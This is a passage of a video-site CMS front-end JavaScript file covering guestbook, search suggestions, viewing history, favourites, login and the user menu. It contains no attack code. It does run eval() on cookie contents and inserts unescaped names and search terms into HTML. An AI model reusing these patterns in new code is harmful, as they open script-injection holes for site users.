                    $(".mac_gbook_box").html(r);
                }, function () {
                    $(".mac_gbook_box").html(lang == 1 ? 'Message loading failed, please refresh...' : '留言加载失败，请刷新...');
                });
            },
            'Submit': function () {
                if ($(".gbook_content").val() == '') {
                    MAC.Pop.Msg(100, 20, (lang == 1 ? 'Please enter your message' : '请输入您的留言!'), 1000);
                    return false;
                }
                MAC.Ajax(maccms.base_url + '/index.php/gbook/saveData', 'post', 'json', $('.gbook_form').serialize(), function (r) {
                    MAC.Pop.Msg(100, 20, r.msg, 1000);
                    if (r.code == 1) {
                        location.reload();
                    } else {

                        if (MAC.Gbook.Verify == 1) {
                            MAC.Verify.Refresh();
                        }
                        if (r.code == 1002) {
                            __macCommCodeRefreshSrc();
                        }
                    }
                });
            },
            'Report': function (name, id) {
                MAC.Pop.Show(400, 300, lang == 1 ? 'Data error' : '数据报错', maccms.base_url + '/index.php/gbook/report.html?id=' + id + '&name=' + encodeURIComponent(name), function (r) {
                });
            },
            'Noinfo': function (name, id) {
                MAC.Pop.Show(400, 300, lang == 1 ? 'Message feedback' : '留言反馈', maccms.base_url + '/index.php/gbook/report.html?id=' + id + '&name=' + encodeURIComponent(name), function (r) {
                });
            }
        },
        'Search': {
            'Init': function () {
                // $('.mac_search').click(function(){
                //     var that=$(this);
                //     var url = that.attr('data-href') ? that.attr('data-href') : maccms.base_url+'/index.php/vod/search.html';
                //     location.href = url + '?wd='+ encodeURIComponent($("#wd").val());
                // });
            },
            'Submit': function () {

                return false;
            }
        },
        'GetHot': {
            'Init': function () {
                MAC.Ajax(maccms.base_url + '/index.php/ajax/suggest?mid=1&wd=1&limit=20', 'get', 'json', '', function (r) {
                    let words = r.list.map(item => item.name)
                    let hot_html = ''
                    words.forEach((item, index) => {
                        hot_html += `<li class='hot_item ${index < 3 ? 'a' : 'b'}'  data-url=${r.url} data-key=${item}>
                            <span class="s1">${index + 1}</span>
                            <span class="s2 search_key">${item}</span>
                        </li>`
                    })
                    $('.hot_keys').append(hot_html)
                    $('.hot_item').click(function (e) {
                        location.href = $(this).attr('data-url').replace('mac_wd', encodeURIComponent($(this).attr('data-key')));
                    })
                });
            }
        },
        'Suggest': {
            'Init': function ($obj, $mid, $jumpurl) {
                try {
                    $($obj).autocomplete(maccms.base_url + '/index.php/ajax/suggest?mid=' + $mid, {
                        inputClass: "mac_input",
                        resultsClass: "mac_results",
                        loadingClass: "mac_loading",
                        width: 175, scrollHeight: 300, minChars: 1, matchSubset: 0, selectFirst: false,
                        cacheLength: 10, multiple: false, matchContains: false, autoFill: false,
                        dataType: "json",
                        parse: function (r) {
                            if (r.code == 1) {
                                let history = JSON.parse(localStorage.getItem('historyList')) || []
                                var parsed = [];
                                // 热门搜索
                                r.site_keywords.forEach((item, index, arr) => {
                                    let obj = {}
                                    obj.name = item
                                    obj.id = 'hot'
                                    obj.url = ''
                                    obj.en = ''
                                    obj.index = index + 1
                                    arr[index] = obj
                                })
                                let data = {
                                    en: '',
                                    id: 'hot',
                                    name: '热门搜索',
                                    url: '',
                                    type: 'tit'
                                }
                                r.site_keywords.unshift(data)
                                // 历史记录
                                history.forEach((item, index, arr) => {
                                    if (item) {
                                        let obj = {}
                                        obj.name = item
                                        obj.id = 'his'
                                        obj.url = ''
                                        obj.en = '',

                                            arr[index] = obj
                                    }
                                })
                                let historyTxt = {
                                    en: 'tit',
                                    id: 'his',
                                    name: '历史搜索',
                                    url: '',
                                    type: 'tit'
                                }
                                history.unshift(historyTxt)

                                if (history.length > 1) {
                                    r.site_keywords = history.concat(r.site_keywords)
                                }

                                $.each(r['site_keywords'], function (index, row) {
                                    row.url = r.url || '';
                                    parsed[index] = {
                                        data: row
                                    };
                                });

                                return parsed;
                            } else {
                                return { data: '' };
                            }
                        },
                        formatItem: function (row, i, max) {
                            if (row.name == '历史搜索') {
                                let delStr = "<span class='del-list'>清除记录</span>"
                                return row.name + delStr;
                            }
                            if (!row.type && row.id != 'his') {
                                let str = `<span class='row-index ${row.index < 4 ? 'active-index' : ''}'  >${row.index}</span>`
                                return str + row.name;
                            } else {
                                return row.name;
                            }

                        },
                        formatResult: function (row, i, max) {
                            return row.text;
                        }
                    }).result(function (event, data, formatted) {
                        $($obj).val(data.name);
                        if (data.name == '热门搜索' || data.name == '历史搜索') return
                        location.href = data.url.replace('mac_wd', encodeURIComponent(data.name));
                    });
                }
                catch (e) { }
            }
        },
        'History': {
            'BoxShow': 0,
            'Limit': 10,
            'Days': 7,
            'Json': '',
            'Init': function () {
                if ($('.mac_history').length == 0) {
                    return;
                }

                $('.mac_history').hover(function (e) {
                    $('.mac_history_box').show();
                }, function () {
                    $('.mac_history_box').hover(function () {
                        MAC.History.BoxShow = 1;
                    }, function () {
                        MAC.History.BoxShow = 0;
                        $('.mac_history_box').hide();
                    });
                });

                var jsondata = [];
                if (this.Json) {
                    jsondata = this.Json;
                } else {
                    var jsonstr = MAC.Cookie.Get('mac_history');
                    if (jsonstr != undefined) {
                        jsondata = eval(jsonstr);
                    }
                }

                html = '<dl class="mac_drop_box mac_history_box" style="display:none;">';
                html += '<dt><a target="_self" href="javascript:void(0)" onclick="MAC.History.Clear();">清空</a></dt>';

                if (jsondata.length > 0) {
                    for ($i = 0; $i < jsondata.length; $i++) {
                        if ($i % 2 == 1) {
                            html += '<dd class="odd">';
                        } else {
                            html += '<dd class="even">';
                        }
                        html += '<a href="' + jsondata[$i].link + '" class="hx_title">' + jsondata[$i].name + '</a></dd>';
                    }
                } else {
                    html += '<dd class="hide">暂无浏览记录</dd>';
                }
                html += '</dl>';

                $('.mac_history').after(html);
                var h = $('.mac_history').height();
                var position = $('.mac_history').position();
                $('.mac_history_box').css({ 'left': position.left, 'top': (position.top + h) });


                if ($(".mac_history_set").attr('data-name')) {
                    var $that = $(".mac_history_set");
                    MAC.History.Set($that.attr('data-name'), $that.attr('data-link'), $that.attr('data-pic'));
                }
            },
            'Set': function (name, link, pic) {
                if (!link) { link = document.URL; }
                var jsondata = MAC.Cookie.Get('mac_history');

                if (jsondata != undefined) {
                    this.Json = eval(jsondata);

                    for ($i = 0; $i < this.Json.length; $i++) {
                        if (this.Json[$i].link == link) {
                            return false;
                        }
                    }

                    jsonstr = '{log:[{"name":"' + name + '","link":"' + link + '","pic":"' + pic + '"},';
                    for ($i = 0; $i < this.Json.length; $i++) {
                        if ($i <= this.Limit && this.Json[$i]) {
                            jsonstr += '{"name":"' + this.Json[$i].name + '","link":"' + this.Json[$i].link + '","pic":"' + this.Json[$i].pic + '"},';
                        } else {
                            break;
                        }
                    }
                    jsonstr = jsonstr.substring(0, jsonstr.lastIndexOf(','));
                    jsonstr += "]}";
                } else {
                    jsonstr = '{log:[{"name":"' + name + '","link":"' + link + '","pic":"' + pic + '"}]}';
                }
                this.Json = eval(jsonstr);
                MAC.Cookie.Set('mac_history', jsonstr, this.Days);
            },
            'Clear': function () {
                MAC.Cookie.Del('mac_history');
                $('.mac_history_box').html(lang == 1 ? '<li class="hx_clear">The viewing record has been cleared.</li>' : '<li class="hx_clear">已清空观看记录。</li>');
            },
        },
        'Ulog': {
            'Init': function () {
                MAC.Ulog.Set();
                MAC.Ulog.Click();

            },
            'Get': function (type, page, limit, call) {
                MAC.Ajax(maccms.base_url + '/index.php/user/ajax_ulog/?ac=list&type=' + type + '&page=' + page + '&limit=' + limit, 'get', 'json', '', call);
            },
            'Set': function () {
                if ($(".mac_ulog_set").attr('data-mid')) {
                    var $that = $(".mac_ulog_set");
                    $.get(maccms.base_url + '/index.php/user/ajax_ulog/?ac=set&mid=' + $that.attr("data-mid") + '&id=' + $that.attr("data-id") + '&sid=' + $that.attr("data-sid") + '&nid=' + $that.attr("data-nid") + '&type=' + $that.attr("data-type"));
                }
            },
            'Click': function () {
                $('body').on('click', 'a.mac_ulog', function (e) {
                    //是否需要验证登录
                    if (MAC.User.IsLogin == 0) {
                        MAC.User.Login();
                        return;
                    }
                    var $that = $(this);
                    if ($that.attr("data-id")) {
                        MAC.Ajax(maccms.base_url + '/index.php/user/ajax_ulog/?ac=set&mid=' + $that.attr("data-mid") + '&id=' + $that.attr("data-id") + '&type=' + $that.attr("data-type"), 'get', 'json', '', function (r) {
                            MAC.Pop.Msg(100, 20, r.msg, 1000);
                            if (r.code == 1) {
                                $that.addClass('disabled');
                            } else {
                                $that.attr('title', r.msg);
                            }
                        });
                    }
                });

                $('body').on('click', 'div.mac_ulog', function (e) {
                    e.preventDefault()
                    //是否需要验证登录
                    if (MAC.User.IsLogin == 0) {
                        MAC.User.Login();
                        return;
                    }
                    var $that = $(this);
                    if ($that.attr("data-id")) {
                        if ($that.children().eq(1).html() == (lang == 1 ? 'Collection' : '收藏')) {
                            MAC.Ajax(maccms.base_url + '/index.php/user/ajax_ulog/?ac=set&mid=' + $that.attr("data-mid") + '&id=' + $that.attr("data-id") + '&type=' + $that.attr("data-type"), 'get', 'json', '', function (r) {
                                if (r.code == 1) {
                                    MAC.Pop.Msg(100, 20, lang == 1 ? 'Collection successful' : r.msg, 1000);
                                    if (!$that.attr("data-uid")) {
                                        $that.attr("data-uid", r.ulog_id)
                                    }
                                    $that.addClass("is_fav")
                                    $that.children().eq(0).html('\u2605')
                                    $that.children().eq(1).html(lang == 1 ? 'Collected' : '已收藏')
                                } else {
                                    MAC.Pop.Msg(100, 20, lang == 1 ? 'fail' : r.msg, 1000);
                                    $that.attr('title', r.msg);
                                }
                            });
                        } else {
                            if ($that.attr("data-uid")) {
                                let data = {
                                    ids: $that.attr("data-uid"),
                                    type: 2,
                                    all: 0
                                }
                                MAC.Ajax(maccms.base_url + '/index.php/user/ulog_del', 'post', 'json', data, function (r) {
                                    if (r.code == '1') {
                                        MAC.Pop.Msg(100, 20, lang == 1 ? 'Cancel collection' : '取消收藏', 1000);
                                        $that.removeClass("is_fav")
                                        $that.children().eq(0).html('\u2606')
                                        $that.children().eq(1).html(lang == 1 ? 'Collection' : '收藏')
                                    } else {
                                        if (lang == 1) {
                                            MAC.Pop.Msg(100, 20, 'fail', 1000);
                                        } else {
                                            MAC.Pop.Msg(100, 20, '取消失败：' + r.msg, 1000);
                                        }

                                    }
                                });
                            } else {
                                $that.removeClass("is_fav")
                                $that.children().eq(0).html('\u2606')
                                $that.children().eq(1).html(lang == 1 ? 'Collection' : '收藏')
                                MAC.Pop.Msg(100, 20, lang == 1 ? 'Cancel collection' : '取消收藏', 1000);
                            }
                        }
                    }
                });
            },
        },
        'User': {
            'BoxShow': 0,
            'IsLogin': 0,
            'UserId': '',
            'UserName': '',
            'UserNickName': '',
            'GroupId': '',
            'GroupName': '',
            'Portrait': '',
            'VipExpireTime': 0,
            '_lastInitIsMobile': false,
            'guestAuthInfo': function () {
                return { is_login: 0, user_id: 0, user_name: '', nick_name: '', group_id: 0, group_name: '', points: 0, user_portrait: '', vip_expire_time: 0 };
            },
            '_authMeUrl': function () {
                if (typeof maccms === 'undefined') return null;
                var base = (maccms.path || '/').replace(/\/+$/, '');
                return (base ? base + '/' : '/') + 'api.php/auth/me';
            },
            'fetchAuthMe': function (cb) {
                if (typeof window.fetch !== 'function') {
                    if (cb) cb(null);
                    return;
                }
                var url = MAC.User._authMeUrl();
                if (!url) {
                    if (cb) cb(null);
                    return;
                }
                fetch(url, { credentials: 'same-origin' })
                    .then(function (r) { return r.json(); })
                    .then(function (res) {
                        var info = (res && Number(res.code) === 1 && res.info) ? res.info : null;
                        if (cb) cb(info);
                    })
                    .catch(function () {
                        if (cb) cb(null);
                    });
            },
            'emitAuthMe': function (info) {
                window.__authMe = info != null ? info : null;
                try {
                    document.dispatchEvent(new CustomEvent('mac:auth-me-ready', { detail: window.__authMe }));
                } catch (e) { }
            },
            'getAuthMe': function () {
                return window.__authMe;
            },
            'clearUserCookies': function () {
                var keys = ['user_id', 'user_name', 'user_nick_name', 'group_id', 'group_name', 'user_check', 'user_portrait'];
                for (var i = 0; i < keys.length; i++) {
                    try { MAC.Cookie.Del(keys[i]); } catch (e) { }
                }
            },
            'applyAuthMeInfo': function (info) {
                if (info && Number(info.is_login) === 1) {
                    this.IsLogin = 1;
                    this.UserId = String(info.user_id != null ? info.user_id : '');
                    this.UserName = info.user_name || '';
                    this.UserNickName = info.nick_name || '';
                    this.GroupId = String(info.group_id != null ? info.group_id : '');
                    this.GroupName = info.group_name || '';
                    this.Portrait = info.user_portrait || '';
                    this.VipExpireTime = Number(info.vip_expire_time) || 0;
                    return;
                }
                this.IsLogin = 0;
                this.UserId = '';
                this.UserName = '';
                this.UserNickName = '';
                this.GroupId = '';
                this.GroupName = '';
                this.Portrait = '';
                this.VipExpireTime = 0;
            },
            '_headPlaysUrl': function () {
                var $n = $('#topnav');
                var u = $n.length ? $n.attr('data-mac-url-plays') : '';
                if (u) return u;
                if (typeof maccms !== 'undefined' && maccms.base_url) {
                    return maccms.base_url + '/index.php/user/plays.html';
                }
                return '/index.php/user/plays.html';
            },
            'syncHeadUserChrome': function () {
                var playsUrl = MAC.User._headPlaysUrl();
                var UName = MAC.User.UserNickName ? MAC.User.UserNickName : MAC.User.UserName;
                var portrait = MAC.User.Portrait || '';
                var now = Date.now() / 1000;
                var gid = parseInt(MAC.User.GroupId, 10) || 0;
                var vipTs = Number(MAC.User.VipExpireTime) || 0;
                var headVip = gid >= 3 && vipTs > now;
                if (MAC.User.IsLogin == 1) {
                    $('.mac_head_plays').each(function () {
                        var $a = $(this);
                        $a.removeClass('user_login');
                        $a.attr('href', playsUrl);
                    });
                    $('img.mac_user').each(function () {
                        if (portrait) $(this).attr('src', portrait);
                    });
                    $('a.mac_user').each(function () {
                        var $a = $(this);
                        $a.removeClass('face_pic').find('.mac-avatar').remove();
                        $a.find('img.face').remove();
                        $a.attr('title', UName);
                        $a.empty();
                        $a.addClass('face_pic');
                        $a.append('<span class="mac-avatar mac-avatar--nav" data-mac-avatar="1" data-user-id="' + (MAC.User.UserId || '') + '"><img class="mac-avatar__img face" src="' + portrait + '" alt="会员头像"></span>');
                    });
                } else {
                    $('.mac_head_plays').each(function () {
                        var $a = $(this);
                        $a.addClass('user_login');
                        $a.attr('href', ' javascript:;');
                    });
                }
                $('.head_avatar_ring').each(function () {
                    var $r = $(this);
                    if (headVip && MAC.User.IsLogin == 1) {
                        // $r.addClass('head_avatar_ring--vip');
                        // if (!$r.find('.head_avatar_vip_badge').length) {
                        //     $r.append('<span class="head_avatar_vip_badge" title="VIP" aria-hidden="true"><i class="iconfont">&#xe638;</i></span>');
                        // }
                    } else {
                        // $r.removeClass('head_avatar_ring--vip');
                    }
                });
                try {
                    if (typeof tplconfig !== 'undefined' && tplconfig.macAvatarVip && tplconfig.macAvatarVip.refresh) {
                        tplconfig.macAvatarVip.refresh();
                    }
                } catch (eMacAv) { }
            },
            'teardownLoggedInChrome': function () {
                $('.mac_user_box').remove();
                $(document).off('mouseenter.macUserZ', '.mac_user_pc_anchor');
                $(document).off('mouseleave.macUserZ', '.mac_user_pc_anchor');
                $(document).off('click.macUserPanelClose');
                $('body').off('click.macUserPanel');
                $('.mac_user_pc_anchor').each(function () {
                    $(this).children().unwrap();
                });
                $('.mac_user').each(function () {
                    var $el = $(this);
                    var pt = (typeof maccms !== 'undefined' && maccms.path_tpl) ? String(maccms.path_tpl).replace(/\/+$/, '') : '';
                    var memberIconSrc = pt ? (pt + '/images/head-nav/用户默认.png') : '';
                    var memberIconHtml = memberIconSrc ? ('<img class="head-nav-icon" src="' + memberIconSrc + '" width="52" height="52" alt="">') : '<i class="iconfont ">&#xe610;</i>';
                    if ($el.is('a.mac_user')) {
                        $el.removeClass('face_pic');
                        $el.attr('title', '').attr('href', ' javascript:;').attr('data-title', 'string_hy');
                        $el.find('.mac-avatar').remove();
                        $el.find('img.face').remove();
                        $el.html(memberIconHtml);
                    } else if ($el.is('img.mac_user')) {
                        var $li = $el.closest('li.top_ico');
                        if ($li.length) {
                            $li.empty().append('<a class="mac_user top_link" href=" javascript:;" data-title="string_hy" title="会员">' + memberIconHtml + '</a>');
                        }
                    }
                });
                MAC.User.syncHeadUserChrome();
            },
            'hydrateFromCookiesAndRender': function (isMobile) {
                var cid = MAC.Cookie.Get('user_id');
                if (cid == undefined || cid === '') {
                    MAC.User.applyAuthMeInfo(null);
                    return;
                }
                MAC.User.UserId = MAC.Cookie.Get('user_id');
                MAC.User.UserName = MAC.Cookie.Get('user_name');
                MAC.User.UserNickName = MAC.Cookie.Get('user_nick_name');
                MAC.User.GroupId = MAC.Cookie.Get('group_id');
                MAC.User.GroupName = MAC.Cookie.Get('group_name');
                MAC.User.Portrait = MAC.Cookie.Get('user_portrait');
                MAC.User.IsLogin = 1;
                MAC.User.emitAuthMe({
                    is_login: 1,
                    user_id: parseInt(MAC.User.UserId, 10) || 0,
                    user_name: MAC.User.UserName || '',
                    nick_name: MAC.User.UserNickName || '',
                    group_id: parseInt(MAC.User.GroupId, 10) || 0,
                    group_name: MAC.User.GroupName || '',
                    points: 0,
                    user_portrait: MAC.User.Portrait || '',
                    vip_expire_time: 0
                });
                MAC.User.renderLoggedInChrome(isMobile);
            },
            'renderLoggedInChrome': function (isMobile) {
                if (MAC.User.IsLogin != 1) return;
                var url = maccms.base_url + '/index.php/user';
                var urlfavs = maccms.base_url + '/index.php/user/favs';
                var UName = MAC.User.UserNickName != null && MAC.User.UserNickName !== '' ? MAC.User.UserNickName : MAC.User.UserName;
                $('.mac_user_box').remove();
                $('.mac_user_pc_anchor').each(function () { $(this).children().unwrap(); });
                if ($('.mac_user').length > 0) {
                    var $userTrigger = $('.mac_user').eq(0);
                    if ($userTrigger.prop('outerHTML').substr(0, 2) == '<a') {
                        $userTrigger.removeClass('face_pic').find('.mac-avatar').remove();
                        $userTrigger.find('img.face').remove();
                        $userTrigger.attr('title', UName);
                        $userTrigger.empty();
                        $userTrigger.addClass('face_pic');
                        $userTrigger.append('<span class="mac-avatar mac-avatar--nav" data-mac-avatar="1" data-user-id="' + (MAC.User.UserId || '') + '"><img class="mac-avatar__img face" src="' + MAC.User.Portrait + '" alt="会员头像"></span>');
                    } else {
                        $('.mac_user').each(function () {
                            var $t = $(this);
                            if ($t.is('img') && MAC.User.Portrait) {
                                $t.attr('src', MAC.User.Portrait);
                            }
                        });
                    }
                    var VIP = '<i class="iconfont user_vip">&#xe638;</i>';
                    var GName = MAC.User.GroupId < 3 ? MAC.User.GroupName : VIP + MAC.User.GroupName;
                    var html = '<div class="mac_user_box dropbox user">';
                    html += '<div class="user_list_box"><div class="user_list"><a class="mac_user_n" href="javascript:;">' + UName + '</a><a class="mac_user_g" href="javascript:;">' + GName + '</a><a class="link" href="' + url + '" target="_blank"><i class="iconfont">&#xe62b;</i> <span data-lang="string_user_center">个人中心</span> </a><a class="link" href="' + urlfavs + '" target="_blank"><i class="iconfont">&#xe629;</i>  <span data-lang="string_user_fav">我的收藏</span></a><a class="link mac_user_logout" href="javascript:;" target="_self"><i class="iconfont">&#xe646;</i><span data-lang="string_user_logout">退出登录</span></a></div></div>';
                    if (isMobile) {
                        $(document.body).append(html);
                    } else {
                        var $ring = $userTrigger.closest('.head_avatar_ring');
                        if ($ring.length) {
                            $ring.after(html);
                            $ring.add($ring.next('.mac_user_box')).wrapAll('<div class="mac_user_pc_anchor"/>');
                        } else {
                            $userTrigger.after(html);
                            var $p = $userTrigger.next('.mac_user_box');
                            if ($p.length) {
                                $userTrigger.add($p).wrapAll('<div class="mac_user_pc_anchor"/>');
                            }
                        }
                    }
                    if (!isMobile) {
                        var $box = $('.head_user .mac_user_box.dropbox').first();
                        if ($box.length && !$box.closest('.mac_user_pc_anchor').length) {
                            var $r = $box.prev('.head_avatar_ring');
                            if ($r.length) {
                                $r.add($box).wrapAll('<div class="mac_user_pc_anchor"/>');
                            } else {
                                var $mu = $box.prev('.mac_user');
                                if ($mu.length) {
                                    $mu.add($box).wrapAll('<div class="mac_user_pc_anchor"/>');
                                }
                            }
                        }
                    }
                    if (isMobile) {
                        if ($userTrigger.length && $userTrigger[0].tagName === 'A') $userTrigger.attr('href', 'javascript:;');
                        function positionMobileUserPanel(anchorEl) {
                            var $panel = $('.mac_user_box');
                            if (!$panel.length || !anchorEl) return;
                            var anchor = anchorEl.jquery ? anchorEl[0] : anchorEl;
                            $panel.removeClass('panel-ready').addClass('show');
                            $panel.css({ top: '', left: '', right: '' });
                            if (typeof MAC.bumpMacUserPanelZ === 'function') {
                                MAC.bumpMacUserPanelZ($panel[0]);
                            }
                            var gap = 8;
                            var vw = window.innerWidth;
                            var vh = window.innerHeight;
                            var setPosition = function () {
                                var rect = anchor.getBoundingClientRect();
                                var pw = $panel.outerWidth() || 160;
                                var ph = $panel.outerHeight() || 200;
                                var top = rect.bottom + gap;
                                var left = rect.right - pw;
                                if (left < gap) left = gap;
                                if (left + pw > vw - gap) left = vw - pw - gap;
                                if (top + ph > vh - gap) top = Math.max(gap, rect.top - ph - gap);
                                if (top < gap) top = gap;
                                $panel.css({ top: top + 'px', left: left + 'px', right: 'auto' });
                            };
                            setPosition();
                            requestAnimationFrame(function () {
                                setPosition();
                                if (typeof MAC.bumpMacUserPanelZ === 'function') {
                                    MAC.bumpMacUserPanelZ($panel[0]);
                                }
                                $panel.addClass('panel-ready');
                            });
                        }
                        $('body').off('click.macUserPanel').on('click.macUserPanel', '.mac_user', function (e) {
                            if (MAC.User.IsLogin == 1) {
                                e.preventDefault();
                                e.stopPropagation();
                                var $panel = $('.mac_user_box');
                                if ($panel.hasClass('show')) {
                                    $panel.removeClass('show panel-ready');
                                    if (typeof MAC.clearMacUserPanelZ === 'function') {
                                        MAC.clearMacUserPanelZ($panel[0]);
                                    }
                                } else {
                                    positionMobileUserPanel($(this));
                                }
                            }
                        });
                        $(document).off('click.macUserPanelClose').on('click.macUserPanelClose', function (e) {
                            var $panel = $('.mac_user_box');
                            if (!$panel.length || !$panel.hasClass('show')) return;
                            if ($(e.target).closest('.user_list_box, .mac_user').length === 0) {
                                $panel.removeClass('show panel-ready');
                                if (typeof MAC.clearMacUserPanelZ === 'function') {
                                    MAC.clearMacUserPanelZ($panel[0]);
                                }
                            }
                        });
                    }
                }
                MAC.User.syncHeadUserChrome();
            },
            'Init': function () {
                var clientWidth = $(window).width();
                var isMobile = clientWidth <= 820;
                try { isMobile = isMobile || (window.matchMedia && window.matchMedia('(max-width: 820px)').matches); } catch (e) { }
                MAC.User._lastInitIsMobile = isMobile;

                if ($('.mac_user').length > 0) {
                    $('body').off('click.macUserLogin', '.mac_user').on('click.macUserLogin', '.mac_user', function (e) {
                        if (MAC.User.IsLogin == 0) {
                            e.preventDefault();
                            MAC.User.Login();
                        }
                    });
                }
                $('body').off('click.macUserLogout', '.mac_user_logout').on('click.macUserLogout', '.mac_user_logout', function (e) {
                    e.preventDefault();
                    MAC.User.Logout();
                });
                $('.user_login').off('click.macUserLoginBtn').on('click.macUserLoginBtn', function () {
                    MAC.User.Login();
                });

                $(document).off('mouseenter.macUserZ', '.mac_user_pc_anchor').on('mouseenter.macUserZ', '.mac_user_pc_anchor', function () {
                    var $box = $(this).find('.mac_user_box.dropbox').first();
                    if ($box.length && typeof MAC.bumpMacUserPanelZ === 'function') {
                        MAC.bumpMacUserPanelZ($box[0]);
                    }
                });
                $(document).off('mouseleave.macUserZ', '.mac_user_pc_anchor').on('mouseleave.macUserZ', '.mac_user_pc_anchor', function () {
                    var $box = $(this).find('.mac_user_box.dropbox').first();
                    if ($box.length && typeof MAC.clearMacUserPanelZ === 'function') {
                        MAC.clearMacUserPanelZ($box[0]);
                    }
                });

                var needHeadAuthSync = $('.mac_user').length > 0 || $('.mac_head_plays').length > 0;
                if (!needHeadAuthSync) {
                    MAC.User.applyAuthMeInfo(null);
                    window.__authMe = null;
                    return;
                }
                var cid = MAC.Cookie.Get('user_id');
                MAC.User.fetchAuthMe(function (info) {
                    if (!info) {
                        if (cid != undefined && cid !== '') {
                            MAC.User.hydrateFromCookiesAndRender(isMobile);
                        } else {
                            MAC.User.clearUserCookies();
                            MAC.User.applyAuthMeInfo(MAC.User.guestAuthInfo());
                            MAC.User.emitAuthMe(MAC.User.guestAuthInfo());
                            MAC.User.teardownLoggedInChrome();
                        }
                        return;
                    }
                    if (Number(info.is_login) !== 1) {
                        MAC.User.clearUserCookies();
                        MAC.User.applyAuthMeInfo(MAC.User.guestAuthInfo());
                        MAC.User.emitAuthMe(MAC.User.guestAuthInfo());
                        MAC.User.teardownLoggedInChrome();
                        return;
                    }
                    MAC.User.applyAuthMeInfo(info);
                    MAC.User.emitAuthMe(info);
                    MAC.User.renderLoggedInChrome(isMobile);
                });
            },
            'CheckLogin': function () {
                if (MAC.User.IsLogin == 0) {
                    MAC.User.Login();
                }
            },
            'Login': function () {
                var ac = 'ajax_login';
                if (MAC.Cookie.Get('user_id') != undefined && MAC.Cookie.Get('user_id') != '') {
                    ac = 'ajax_info';
                }
                MAC.Pop.Show(460, 560, '', maccms.base_url + '/index.php/user/' + ac, function (r) {
                    $('.mac_pop').addClass('mac_pop_login');
                    $('.mac_pop_bg').addClass('mac_pop_bg_login');
                    $('body').off('click', '.login_form_submit');
                    $('body').on('click', '.login_form_submit', function (e) {
                        $(this).unbind('click');

                        var _pathBase = (maccms.path || '/').replace(/\/+$/, '');
                        var _loginOrRegUrl = (_pathBase ? _pathBase + '/' : '/') + 'api.php/user/login_or_register';
                        MAC.Ajax(_loginOrRegUrl, 'post', 'json', $('.mac_login_form').serialize(), function (r) {
                            if (r.msg != '') {
                                MAC.alert(r.msg);
                            }
                            if (r.code == 1) {
                                var _isNewRegister = String(r.action || '') === 'register';
                                var _acc = $.trim($('.mac_login_form [name="user_name"]').val() || '');
                                var _pwd = $.trim($('.mac_login_form [name="user_pwd"]').val() || '');
                                MAC.Pop.Remove();
                                var mob = MAC.User._lastInitIsMobile;
                                MAC.User.fetchAuthMe(function (info) {
                                    if (!info || Number(info.is_login) !== 1) {
                                        MAC.User.hydrateFromCookiesAndRender(mob);
                                        return;
                                    }
                                    MAC.User.applyAuthMeInfo(info);
                                    MAC.User.emitAuthMe(info);
                                    MAC.User.renderLoggedInChrome(mob);
                                    if (_isNewRegister && _acc && _pwd) {
                                        if (typeof MAC.showRegSuccess === 'function') {
                                            MAC.showRegSuccess({
                                                account: _acc,
                                                password: _pwd,
                                                bindUrl: (_pathBase ? _pathBase : '') + '/index.php/user/bind'
                                            });
                                        } else {
                                            MAC.alert('注册成功，请保存账号与密码');
                                        }
                                    }
                                    // 播放/阅读等页的会员门为 SSR，无刷新登录后须整页重载才能重新计算权限与播放器
                                    if (typeof document !== 'undefined' && document.querySelector('.popedom-upgrade-gate')) {
                                        window.location.reload();
                                    }
                                });
                            }
                        });
                    });
                });
            },
            'Logout': function () {
                MAC.Ajax(maccms.base_url + '/index.php/user/logout', 'post', 'json', '', function (r) {
                    MAC.Pop.Msg(100, 20, r.msg, 1000);
                    if (r.code == 1) {
                        MAC.User.clearUserCookies();
                        MAC.User.applyAuthMeInfo(MAC.User.guestAuthInfo());
                        MAC.User.emitAuthMe(MAC.User.guestAuthInfo());
                        MAC.User.teardownLoggedInChrome();
                    }
                });
            },
            'PopedomCallBack': function (trysee, h) {
                window.setTimeout(function () {
                    $(window.frames["player_if"].document).find(".MacPlayer").html(h);
                }, 1000 * 10 * trysee);
            },
            'BuyPopedom': function (o) {
                var $that = $(o);
                if ($that.attr("data-id")) {
                    MAC.confirm('您确认购买此条数据访问权限吗？', function () {
                        MAC.Ajax(maccms.base_url + '/index.php/user/ajax_buy_popedom.html?id=' + $that.attr("data-id") + '&mid=' + $that.attr("data-mid") + '&sid=' + $that.attr("data-sid") + '&nid=' + $that.attr("data-nid") + '&type=' + $that.attr("data-type"), 'get', 'json', '', function (r) {
                            $that.addClass('disabled');
                            MAC.Pop.Msg(300, 50, r.msg, 2000);
                            if (r.code == 1) {
                                top.location.reload();
                            }
                            $that.removeClass('disabled');
                        });
                    });
                }
            }
        },
        'parseZIndexEl': function (el) {
            if (!el || !el.ownerDocument) return 0;
            var z = parseInt(el.style.zIndex, 10);
            if (!isNaN(z)) return z;
            try {
                if (el.style && typeof el.style.getPropertyValue === 'function') {
                    var raw = el.style.getPropertyValue('z-index');
                    if (raw) {
                        z = parseInt(String(raw).replace(/\s*!important\s*/i, '').trim(), 10);
                        if (!isNaN(z)) return z;
                    }
                }
            } catch (e0) {}
            try {
                z = parseInt(window.getComputedStyle(el).zIndex, 10);
                return isNaN(z) ? 0 : z;
            } catch (e) {
                return 0;
            }
        },
        /** 充值弹窗 #recharge-overlay.show 会用 important 动态顶到最上层，全局浮层必须再高于它 */
        'rechargeOverlayEffectiveZ': function () {
            try {
                var ro = document.getElementById('recharge-overlay');
                if (!ro || !ro.classList || !ro.classList.contains('show')) return 0;
                var z = MAC.parseZIndexEl(ro);
                if (!z && ro.style && typeof ro.style.getPropertyValue === 'function') {
                    var p = ro.style.getPropertyValue('z-index');
                    var n = parseInt(String(p || '').replace(/\s*!important\s*/i, '').trim(), 10);
                    if (!isNaN(n)) z = n;
                }
                return z;
            } catch (e) {
                return 0;
            }
        },
        'clampOverlayZAboveRecharge': function (baseZ) {
            var b = parseInt(baseZ, 10);
            if (isNaN(b)) b = 0;
            var rz = MAC.rechargeOverlayEffectiveZ();
            if (rz > 0) return Math.max(b, rz + 10);
            return b;
        },
        /** 取当前页面上 MAC.Pop / Pop.Msg 等浮层实际 z-index，保证 confirm 等叠在其上（含 ajax 升级底栏 sheet） */
        'bumpZAbovePopLayers': function (baseZ) {
            var b = parseInt(baseZ, 10);
            if (isNaN(b)) b = 0;
            var maxPop = 0;
            function consider(el) {
                if (!el || !el.ownerDocument) return;
                try {
                    var st = window.getComputedStyle(el);
                    if (st.display === 'none' || st.visibility === 'hidden') return;
                } catch (e0) { return; }
                var z = MAC.parseZIndexEl(el);
